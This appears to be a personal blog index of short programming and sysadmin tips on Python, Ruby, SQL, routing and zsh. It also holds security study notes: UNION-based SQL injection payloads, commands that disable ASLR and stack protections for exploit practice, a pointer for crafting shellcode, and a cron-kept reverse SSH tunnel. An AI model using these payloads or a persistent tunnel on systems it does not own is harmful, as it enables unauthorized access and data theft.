      <p>Ruby has <a href="http://www.ruby-doc.org/core-1.9.3/ARGF.html">ARGF</a> and Perl has the <a href="http://perldoc.perl.org/perlop.html#I%2fO-Operators">diamond operator</a>, but what convenience
object or operator does Python provide for reading from files provided on the
command line or <code>stdin</code>?</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">fileinput</span>
<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">fileinput</span><span class="o">.</span><span class="nb">input</span><span class="p">():</span>
    <span class="n">process</span><span class="p">(</span><span class="n">line</span><span class="p">)</span></code></pre></div>
<p><a href="http://docs.python.org/2/library/fileinput.html">http://docs.python.org/2/library/fileinput.html</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/coalesce/">coalesce</a></h2>
      <time>Jan 29, 2013</time>
      <p>I have never encountered the <code>COALESCE</code> function in SQL, so I feel the need to
take note of it, <code>COALESCE(value, ...)</code> returns the first non-NULL value in the
argument list.</p>

<p><a href="http://www.postgresql.org/docs/9.1/static/functions-conditional.html">http://www.postgresql.org/docs/9.1/static/functions-conditional.html</a><br />
<a href="http://dev.mysql.com/doc/refman/5.0/en/comparison-operators.html#function_coalesce">http://dev.mysql.com/doc/refman/5.0/en/comparison-operators.html#function_coalesce</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/reverse-ssh-tunnel/">reverse ssh tunnel</a></h2>
      <time>Jan 18, 2013</time>
      <p>When I have a machine behind a NAT that I know I&rsquo;ll need remote access to over
the weekend, I add this rudimentary little script:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span><span class="nv">RUSER</span><span class="o">=</span>warrick
<span class="nv">LPORT</span><span class="o">=</span><span class="m">5555</span>
<span class="nv">RHOST</span><span class="o">=</span><span class="s2">&#34;74.207.228.87&#34;</span>

<span class="nv">COMMAND</span><span class="o">=</span><span class="s2">&#34;ssh -N -f -R </span><span class="si">${</span><span class="nv">LPORT</span><span class="si">}</span><span class="s2">:localhost:22 </span><span class="si">${</span><span class="nv">RUSER</span><span class="si">}</span><span class="s2">@</span><span class="si">${</span><span class="nv">RHOST</span><span class="si">}</span><span class="s2">&#34;</span>
pgrep -f -x <span class="s2">&#34;</span><span class="nv">$COMMAND</span><span class="s2">&#34;</span> &gt; /dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="o">||</span> <span class="nv">$COMMAND</span></code></pre></div>
<p>I then add this to the crontab, which runs the script every 5 minutes:</p>
<div class="highlight"><pre class="chroma"><code class="language-cron" data-lang="cron">#  KEY
#  +---------------- minute (0 - 59)
#  |  +------------- hour (0 - 23)
#  |  |  +---------- day of month (1 - 31)
#  |  |  |  +------- month (1 - 12)
#  |  |  |  |  +---- day of week (0 - 7 with Sunday=0 &amp; 7)
#  |  |  |  |  |
#  *  *  *  *  *  command to be executed
  */5 *  *  *  *  bash /home/user/rsshchk.sh</code></pre></div>
<p>So, now I know I can ssh into the $RHOST and then ssh to the localhost at
$LPORT, allowing me access to the NAT&rsquo;d box:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">ssh -p LPORT RUSER@locahost</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/redis-lru-cache-decorator-in-python/">redis lru cache decorator in python</a></h2>
      <time>Dec 9, 2012</time>
      <p>Python 3 offers a brilliant decorator that adds a Least Recently Used (LRU)
cache to any function:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="nd">@lru_cache</span><span class="p">(</span><span class="n">maxsize</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">get_pep</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
    <span class="sa"></span><span class="s1">&#39;Retrieve text of a Python Enhancement Proposal&#39;</span>
    <span class="n">resource</span> <span class="o">=</span> <span class="sa"></span><span class="s1">&#39;http://www.python.org/dev/peps/pep-</span><span class="si">%04d</span><span class="s1">/&#39;</span> <span class="o">%</span> <span class="n">num</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">resource</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">urllib</span><span class="o">.</span><span class="n">error</span><span class="o">.</span><span class="n">HTTPError</span><span class="p">:</span>
        <span class="k">return</span> <span class="sa"></span><span class="s1">&#39;Not Found&#39;</span>

<span class="o">&gt;&gt;&gt;</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">290</span><span class="p">,</span> <span class="mi">308</span><span class="p">,</span> <span class="mi">320</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">218</span><span class="p">,</span> <span class="mi">320</span><span class="p">,</span> <span class="mi">279</span><span class="p">,</span> <span class="mi">289</span><span class="p">,</span> <span class="mi">320</span><span class="p">,</span> <span class="mi">9991</span><span class="p">:</span>
<span class="o">...</span>     <span class="n">pep</span> <span class="o">=</span> <span class="n">get_pep</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
<span class="o">...</span>     <span class="k">print</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">pep</span><span class="p">))</span>

<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="n">get_pep</span><span class="o">.</span><span class="n">cache_info</span><span class="p">())</span>
<span class="n">CacheInfo</span><span class="p">(</span><span class="n">hits</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">misses</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span> <span class="n">maxsize</span><span class="o">=</span><span class="mi">20</span><span class="p">,</span> <span class="n">currsize</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span></code></pre></div>
<p>Functools has been <a href="https://github.com/MiCHiLU/python-functools32">back-ported</a> to Python 2.7; however, I was interested in
creating a similar LRU cache decorator but leveraging a Redis server so that
the cache can be shared across several worker programs. The cache will be
semi-persistant allowing workers to restart as necessary.</p>

<p>It turned out to only take 50 lines of Python, so I am sharing it:<br />
<a href="https://gist.github.com/4247343">https://gist.github.com/4247343</a></p>

<p><a href="http://docs.python.org/3/library/functools.html#functools.lru_cache">http://docs.python.org/3/library/functools.html#functools.lru_cache</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/week-of-year-in-python-and-in-postgres/">week of year in python and in postgres</a></h2>
      <time>Dec 4, 2012</time>
      <div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">datetime</span>

<span class="n">today</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">date</span><span class="o">.</span><span class="n">today</span><span class="p">()</span>
<span class="n">today</span><span class="o">.</span><span class="n">isocalendar</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="k">EXTRACT</span><span class="p">(</span><span class="n">WEEK</span> <span class="k">FROM</span> <span class="k">TIMESTAMP</span> <span class="s1">&#39;2012-12-04 20:38:40&#39;</span><span class="p">);</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/mdfind/">mdfind</a></h2>
      <time>Oct 31, 2012</time>
      <p>I frequently use Spotlight, and I was pleasantly surprised to discover it has a
command-line complement, <code>mdfind</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">% mdfind sniffer.pdf
/Users/warrick/Desktop/sniffers/sniffer.pdf
/Users/warrick/CSCI/CSCI <span class="m">6760</span> S12/presentations/sniffers/sniffer.pdf</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/multiple-interfaces-multiple-gateways/">multiple interfaces, multiple gateways</a></h2>
      <time>Oct 28, 2012</time>
      

<p>When configuring two interfaces, each on a different subnet, you must add an
additional routing table to isolate interface traffic (e.g. eth0 in, eth0 out).</p>

<h4 id="1-create-a-routing-table">1. Create a routing table.</h4>

<p>In our example we create a table named &lsquo;secondary&rsquo; with identifier 252:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">  $ <span class="nb">echo</span> <span class="s1">&#39;252 secondary&#39;</span> &gt;&gt; /etc/iproute2/rt_tables</code></pre></div>
<p>If you check out <code>/etc/iproute2/rt_tables</code> you&rsquo;ll see there are a few reserved
identifiers one of which is for the primary routing table, main:</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">#
# reserved values
#
255	local
254	main
253	default
0	unspec</code></pre></div>
<h4 id="2-add-rules-so-the-linux-kernel-will-use-our-new-table">2. Add rules so the Linux kernel will use our new table:</h4>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ip rule add to <span class="m">10</span>.0.1.0/24 table secondary
$ ip rule add from <span class="m">10</span>.0.1.0/24 table secondary

$ ip rule list  
<span class="m">0</span>:	from all lookup <span class="nb">local</span> 
<span class="m">32764</span>:	from <span class="m">10</span>.0.1.1/24 lookup secondary 
<span class="m">32765</span>:	from all to <span class="m">10</span>.0.1.0/24 lookup secondary 
<span class="m">32766</span>:	from all lookup main 
<span class="m">32767</span>:	from all lookup default </code></pre></div>
<h4 id="3-add-an-entry-to-the-new-routing-table-mapping-the-subnet-traffic-to-the-correct-interface">3. Add an entry to the new routing table mapping the subnet traffic to the correct interface:</h4>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ip route add <span class="m">10</span>.0.1.0/24 dev eth0 src <span class="m">10</span>.0.1.5 table secondary</code></pre></div>
<h4 id="4-add-an-entry-specifying-the-gateway-of-the-subnet">4. Add an entry specifying the gateway of the subnet:</h4>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ip route default via <span class="m">10</span>.0.1.1 dev eth0 table secondary</code></pre></div>
<p>That is it, now traffic on 10.0.1.0/24 will be routed through the secondary
table, and we can take a look at our routes:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ip route list table secondary
default via <span class="m">10</span>.0.1.1 dev eth0 
<span class="m">10</span>.0.1.0/24 dev eth0  scope link  src <span class="m">10</span>.0.1.5</code></pre></div>
<p>In Ubuntu, if you want this configuration to persist across boots you&rsquo;ll need
to add it your your <code>/etc/network/interfaces</code> config:</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">auto eth0
iface eth0 inet static
address 10.0.1.5
netmask 255.255.255.0
up ip rule add to 10.0.1.0/24 lookup secondary
up ip rule add from 10.0.1.0/24 lookup secondary
up ip route add 10.0.1.0/24 dev eth0 src 10.0.1.5 table secondary
up ip route add default via 10.0.1.1 dev eth0 table secondary</code></pre></div>
<p><a href="http://segv.me/posts/iproute2">http://segv.me/posts/iproute2</a><br />
<a href="http://kindlund.wordpress.com/2007/11/19/configuring-multiple-default-routes-in-linux/">http://kindlund.wordpress.com/2007/11/19/configuring-multiple-default-routes-in-linux/</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/x-days-ago-in-python/">x days ago in python</a></h2>
      <time>Oct 23, 2012</time>
      <div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">datetime</span>

<span class="n">today</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">date</span><span class="o">.</span><span class="n">today</span><span class="p">()</span>
<span class="n">yesterday</span> <span class="o">=</span> <span class="n">today</span> <span class="o">-</span> <span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">x</span> <span class="o">=</span> <span class="mi">5</span>
<span class="n">x_days_ago</span> <span class="o">=</span> <span class="n">today</span> <span class="o">-</span> <span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">x</span><span class="p">)</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/duck-punching-in-action/">duck punching, in action</a></h2>
      <time>Oct 22, 2012</time>
      <p>Following up on last post, this post is about a monkey patch I wrote to get a
little more functionality out of one of Ruby&rsquo;s standard libraries, <code>Resolv</code>.</p>

<p><code>Resolv</code> is a DNS stub resolver library written in Ruby that provides the
ability to perform non-blocking DNS requests, but it doesn&rsquo;t expose any sort of
access to the raw DNS records returned, at least that I could tell.</p>

<p>So, after tracing the code, I found that copying an existing function,
modifying it very slightly, and patching it in was the easiest way to get in:</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;resolv&#39;</span>

<span class="k">class</span> <span class="nc">Resolv</span><span class="o">::</span><span class="no">DNS</span>
  <span class="k">def</span> <span class="nc"></span><span class="o"></span><span class="nf">query</span><span class="p">(</span><span class="nb">name</span><span class="p">,</span> <span class="n">typeclass</span><span class="p">)</span>
    <span class="n">lazy_initialize</span>
    <span class="n">requester</span> <span class="o">=</span> <span class="n">make_udp_requester</span>
    <span class="n">senders</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="k">begin</span>
      <span class="vi">@config</span><span class="o">.</span><span class="n">resolv</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">candidate</span><span class="p">,</span> <span class="n">tout</span><span class="p">,</span> <span class="n">nameserver</span><span class="p">,</span> <span class="n">port</span><span class="o">|</span>
        <span class="n">msg</span> <span class="o">=</span> <span class="no">Message</span><span class="o">.</span><span class="n">new</span>
        <span class="n">msg</span><span class="o">.</span><span class="n">rd</span> <span class="o">=</span> <span class="mi">1</span>
        <span class="o"></span><span class="n">msg</span><span class="o">.</span><span class="n">add_question</span><span class="p">(</span><span class="n">candidate</span><span class="p">,</span> <span class="n">typeclass</span><span class="p">)</span>
        <span class="k">unless</span> <span class="n">sender</span> <span class="o">=</span> <span class="n">senders</span><span class="o">[[</span><span class="n">candidate</span><span class="p">,</span> <span class="n">nameserver</span><span class="p">,</span> <span class="n">port</span><span class="o">]]</span>
          <span class="n">sender</span> <span class="o">=</span> <span class="n">senders</span><span class="o">[[</span><span class="n">candidate</span><span class="p">,</span> <span class="n">nameserver</span><span class="p">,</span> <span class="n">port</span><span class="o">]]</span> <span class="o">=</span>
            <span class="n">requester</span><span class="o">.</span><span class="n">sender</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">candidate</span><span class="p">,</span> <span class="n">nameserver</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
        <span class="k">end</span>
        <span class="n">reply</span><span class="p">,</span> <span class="n">reply_name</span> <span class="o">=</span> <span class="n">requester</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">tout</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">reply</span><span class="o">.</span><span class="n">rcode</span> <span class="o">==</span> <span class="no">RCode</span><span class="o">::</span><span class="no">NoError</span>
          <span class="k">if</span> <span class="n">reply</span><span class="o">.</span><span class="n">tc</span> <span class="o">==</span> <span class="mi">1</span> <span class="o"></span><span class="ow">and</span> <span class="ow">not</span> <span class="no">Requester</span><span class="o">::</span><span class="no">TCP</span> <span class="o">===</span> <span class="n">requester</span>
            <span class="n">requester</span><span class="o">.</span><span class="n">close</span>
            <span class="c1"># Retry via TCP:</span>
            <span class="n">requester</span> <span class="o">=</span> <span class="n">make_tcp_requester</span><span class="p">(</span><span class="n">nameserver</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
            <span class="n">senders</span> <span class="o">=</span> <span class="p">{}</span>
            <span class="k">redo</span>
          <span class="k">end</span>
          <span class="k">return</span> <span class="n">reply</span> <span class="k">end</span>
      <span class="k">end</span>
    <span class="k">ensure</span>
      <span class="n">requester</span><span class="o">.</span><span class="n">close</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="n">dns</span> <span class="o">=</span> <span class="no">Resolv</span><span class="o">::</span><span class="no">DNS</span><span class="o">.</span><span class="n">new</span>

<span class="n">resp</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="s2">&#34;segv.me&#34;</span><span class="p">,</span> <span class="no">Resolv</span><span class="o">::</span><span class="no">DNS</span><span class="o">::</span><span class="no">Resource</span><span class="o">::</span><span class="no">IN</span><span class="o">::</span><span class="n">A</span><span class="p">)</span>

<span class="n">resp</span><span class="o">.</span><span class="n">rcode</span>
<span class="o">=&gt;</span> <span class="mi">0</span>

<span class="o">[</span><span class="n">resp</span><span class="o">.</span><span class="n">encode</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;m*&#34;</span><span class="p">)</span>
<span class="o">=&gt;</span> <span class="s2">&#34;XYKBgAABAAEABQAABHNlZ3YCbWUAAAEAAcAMAAEAA...&#34;</span></code></pre></div>
<p>Of course this certainly isn&rsquo;t as full-featured as <code>Net::DNS</code>, the Perl analog,
but it doesn&rsquo;t require a gem as <code>Resolv</code> is part of the <code>stdlib</code>.</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/duck-punching/">duck punching</a></h2>
      <time>Oct 15, 2012</time>
      <p>Heh, monkey patching is also called &ldquo;duck punching&rdquo;.</p>

<blockquote cite="http://www.ericdelabar.com/2008/05/metaprogramming-javascript.html">
Well, I was just totally sold by Adam, the idea being that if it walks like a
duck and talks like a duck, it's a duck, right? So if this duck is not giving
you the noise that you want, you've got to just punch that duck until it
returns what you expect.
</blockquote>

<p><a href="http://en.wikipedia.org/wiki/Monkey_patch">http://en.wikipedia.org/wiki/Monkey_patch</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/chattr/">chattr</a></h2>
      <time>Oct 15, 2012</time>
      <p>A friend reminded me about <code>chattr</code>. Linux ext{2,3,4} filesystems have
supplementary file attributes which can be modified with the &ldquo;<strong>ch</strong>ange
<strong>attr</strong>ibutes&rdquo; utility found in the <code>e2fsprogs</code> package.</p>

<p>The two most interesting in my opinion are <code>+/- i</code> for <strong>immutable</strong> and
<code>+/- j</code> for <strong>secure deletion</strong>:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo chattr +i /bin/ps
$ sudo chattr +j secret.txt

$ lsattr bar
----i----j---e- bar</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/ruby-tricks/">ruby tricks</a></h2>
      <time>Oct 11, 2012</time>
      <p>James Edward Gray II, a Ruby Rogue, just gave a talk at the Aloha Ruby
Conference about a bunch of Ruby tricks. Here are a few I&rsquo;m cataloging, but
they are all worth a looksy.</p>

<p><strong>Trap (with a twist):</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;pry&#39;</span>

<span class="nb">trap</span><span class="p">(</span><span class="ss">:INT</span><span class="p">)</span> <span class="k">do</span>
  <span class="nb">binding</span><span class="o">.</span><span class="n">pry</span>
  <span class="nb">trap</span><span class="p">(</span><span class="ss">:INT</span><span class="p">,</span> <span class="s2">&#34;EXIT&#34;</span><span class="p">)</span>
<span class="k">end</span>

<span class="kp">loop</span> <span class="k">do</span>
  <span class="nb">sleep</span>
<span class="k">end</span></code></pre></div>
<p><strong>Daemonize:</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="no">Process</span><span class="o">.</span><span class="n">daemon</span>

<span class="kp">loop</span> <span class="k">do</span>
  <span class="nb">sleep</span>
<span class="k">end</span></code></pre></div>
<p><strong>Subprocess:</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="c1"># spawn([env,] command... [,options]) =&gt; pid</span>
<span class="n">pid</span> <span class="o">=</span> <span class="n">spawn</span><span class="p">({</span><span class="s2">&#34;VAR&#34;</span> <span class="o">=&gt;</span> <span class="mi">7564</span><span class="o"></span><span class="p">},</span> 
           <span class="s2">&#34;/usr/local/bin/program&#34;</span><span class="p">,</span> 
           <span class="k">in</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;input-file&#34;</span><span class="p">))</span>

<span class="no">Process</span><span class="o">.</span><span class="n">wait</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span></code></pre></div>
<p><strong>Ruby Command Flags:</strong><br />
The Ruby executable has many useful flags as well, recall that the global
variable <code>$_</code> in Ruby has the value of the last string read by <code>gets</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="o">-</span><span class="n">e</span>    <span class="n">execute</span> <span class="n">specified</span> <span class="no">Ruby</span> <span class="n">code</span><span class="o">.</span>
       <span class="sx">% ruby </span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;puts &#34;ohai&#34;&#39;</span>
       <span class="n">ohai</span>

<span class="o">-</span><span class="n">n</span>    <span class="n">performs</span> <span class="n">the</span> <span class="n">following</span> <span class="n">on</span> <span class="n">input</span> <span class="n">files</span><span class="o">.</span>
       <span class="k">while</span> <span class="nb">gets</span>
           <span class="o">...</span>
       <span class="k">end</span>

       <span class="sx">% ruby </span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;puts $_.upcase&#39;</span> <span class="n">foobars</span>
        <span class="no">FOO</span>
        <span class="no">BAR</span>

<span class="o">-</span><span class="nb">p</span>    <span class="n">same</span> <span class="n">as</span> <span class="n">n</span><span class="p">,</span> <span class="n">except</span> <span class="nb">print</span> <span class="n">the</span> <span class="n">value</span> <span class="n">of</span> <span class="vg">$_</span> <span class="n">after</span> <span class="n">each</span> <span class="kp">loop</span>

       <span class="sx">% ruby </span> <span class="o">-</span><span class="nb">p</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;$_.upcase!&#39;</span>  <span class="n">foobars</span>
        <span class="no">FOO</span>
        <span class="no">BAR</span>


<span class="o">-</span><span class="n">i</span>    <span class="n">extension</span>   <span class="k">in</span><span class="o">-</span><span class="n">place</span> <span class="n">modification</span> <span class="n">of</span> <span class="n">input</span> <span class="n">files</span><span class="p">,</span> 
      <span class="n">specify</span> <span class="n">file</span> <span class="n">extension</span> <span class="n">backup</span> <span class="n">file</span> <span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="o">.</span> <span class="o">.</span><span class="n">bak</span><span class="p">)</span> 

       <span class="sx">% echo </span> <span class="n">matz</span> <span class="o">&gt;</span> <span class="sr">/tmp/</span><span class="n">junk</span>
       <span class="sx">% cat </span> <span class="sr">/tmp/</span><span class="n">junk</span>
        <span class="n">matz</span>
       <span class="sx">% ruby </span> <span class="o">-</span><span class="nb">p</span> <span class="o">-</span><span class="n">i</span><span class="o">.</span><span class="n">bak</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;$_.upcase!&#39;</span> <span class="sr">/tmp/</span><span class="n">junk</span>
       <span class="sx">% cat </span> <span class="sr">/tmp/</span><span class="n">junk</span>
        <span class="no">MATZ</span>
       <span class="sx">% cat </span> <span class="sr">/tmp/</span><span class="n">junk</span><span class="o">.</span><span class="n">bak</span>
        <span class="n">matz</span></code></pre></div>
<p><a href="https://speakerdeck.com/u/jeg2/p/10-things-you-didnt-know-ruby-could-do">https://speakerdeck.com/u/jeg2/p/10-things-you-didnt-know-ruby-could-do</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/basic-sql-injection/">basic sql injection</a></h2>
      <time>Oct 4, 2012</time>
      <div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="k">user</span>
<span class="k">FROM</span> <span class="n">users</span> 
<span class="k">WHERE</span> <span class="k">user</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;jeffrey&#39;</span><span class="p">;</span></code></pre></div>
<ol>
<li><p>FIND NUMBER OF COLUMNS<br />
&ldquo;order by&rdquo; trick - test if you can order by a column number</p></li>

<li><p>NOW WE CAN DO A UNION (# OF COLUMNS MUST MATCH)<br />
&rsquo; union select 1,2,3,version() &ndash; -</p></li>

<li><p>NOW WE CAN GET TABLE, COLUMN, AND DATABASE INFO<br />
&rsquo; union select 1,2,3,table_name from information_schema.tables where table_schema=&ldquo;x8250&rdquo; &ndash; -<br />
&rsquo; union select 1,2,3,column_name from information_schema.columns where table&hellip;</p></li>
</ol>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/disable-aslr/">disable aslr</a></h2>
      <time>Sep 29, 2012</time>
      <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo sysctl -w kernel.randomize_va_space<span class="o">=</span><span class="m">0</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/zsh-globbing-qualifiers/">zsh globbing qualifiers</a></h2>
      <time>Sep 27, 2012</time>
      <p>Globbing is the term for pattern matching that shells use to expand wildcards
like * or ?.  In <b class="mono">zsh</b>, globbing patterns can be followed by
a list of qualifiers inside of parenthesis, which restrict the filenames that
match the glob.</p>

<p>For example, here are a few globs with simple modifiers:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># . modifier means all &#34;plain files&#34;
</span><span class="c1"></span>% ls *<span class="o">(</span>.<span class="o">)</span> 
foo.txt  bar.jpg

<span class="c1">#  * modifier means all &#34;executable plain files&#34;
</span><span class="c1"></span>% ls *<span class="o">(</span>*<span class="o">)</span>        
a.out</code></pre></div>
<p>Normally, the * wildcard would match and expand to all files in the directory
(except hidden dot-files). However, with a modifier specified in parens after
the glob, you can qualify or restrict your glob.</p>

<p>Besides filtering, you can also specify sorting qualifiers:
<pre>
<b class="mono">o<i>c</i></b> &mdash; sort by criteria <i class="mono">c</i> ascending.
<b class="mono">O<i class="mono">c</i></b> &mdash; sort by criteria <i class="mono">c</i> descending.
</pre></p>

<p>Where criteria <code>c</code> can be:
<pre>
<b>n</b>   name  (default)
<b>L</b>   size (length) of file
<b>a</b>   access time
<b>m</b>   modification time
<b>c</b>   creation time
</pre></p>

<p>Here is the magic, qualifiers can actually be indexed with square braces of the
form <code>[beg[,end]]</code>. For example, you can get the most recently modified file:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># glob for the newest file by modification
</span><span class="c1"></span>% ls -lha *<span class="o">(</span>om<span class="o">[</span><span class="m">1</span><span class="o">])</span>
quux

<span class="c1"># glob for the oldest file by modification
</span><span class="c1"></span>% ls -lha *<span class="o">(</span>Om<span class="o">[</span><span class="m">1</span><span class="o">])</span>
a.out</code></pre></div>
<p><a href="http://zsh.sourceforge.net/Doc/Release/Expansion.html#Glob-Qualifiers">http://zsh.sourceforge.net/Doc/Release/Expansion.html#Glob-Qualifiers</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/compile-binary-without-protection/">compile binary without protection</a></h2>
      <time>Sep 25, 2012</time>
      <p>Compile a 32bit binary with an executable stack and no canary values:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">gcc -m32                      
    -fno-stack-protector
    -zexecstack
    -mpreferred-stack-boundary<span class="o">=</span><span class="m">2</span>
    -o foo foo.c</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/one-line-tree-in-python/">one-line tree in python</a></h2>
      <time>Aug 30, 2012</time>
      <p>Brilliant:</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">defaultdict</span>

<span class="k">def</span> <span class="nf">tree</span><span class="p">():</span> <span class="k">return</span> <span class="n">defaultdict</span><span class="p">(</span><span class="n">tree</span><span class="p">)</span></code></pre></div>
<p><a href="https://gist.github.com/2012250">https://gist.github.com/2012250</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/restrict-routes-to-an-ip-in-rails/">restrict routes to an ip in rails</a></h2>
      <time>Aug 19, 2012</time>
      <div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby">  <span class="n">constraints</span> <span class="ss">:remote_ip</span> <span class="o">=&gt;</span> <span class="s2">&#34;127.0.0.1&#34;</span> <span class="k">do</span>
      <span class="n">get</span> <span class="s1">&#39;/restricted&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;root#restricted&#34;</span>
  <span class="k">end</span></code></pre></div>
<blockquote>
<p>&ldquo;You can also constrain a route based on any method on the Request object
that returns a String.&rdquo;</p>
</blockquote>

<p><a href="http://guides.rubyonrails.org/routing.html#request-based-constraints">http://guides.rubyonrails.org/routing.html#request-based-constraints</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/linux-syscalls/">linux syscalls</a></h2>
      <time>Jun 15, 2012</time>
      <p>Where are linux system calls defined?</p>

<p>If you are crafting your own shellcode, you often need to find the syscall
numbers. Syscalls are usually defined in:
<pre>
/usr/include/asm/unistd_32.h
/usr/include/asm/unistd_64.h
</pre></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/python-one-line-ftp/">python one-line ftp</a></h2>
      <time>Jun 3, 2012</time>
      <p>So, while looking for a quick and easy FTP server analog to this popular Python trick:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ python -m SimpleHTTPServer
Serving HTTP on <span class="m">0</span>.0.0.0 port <span class="m">8000</span> ...</code></pre></div>
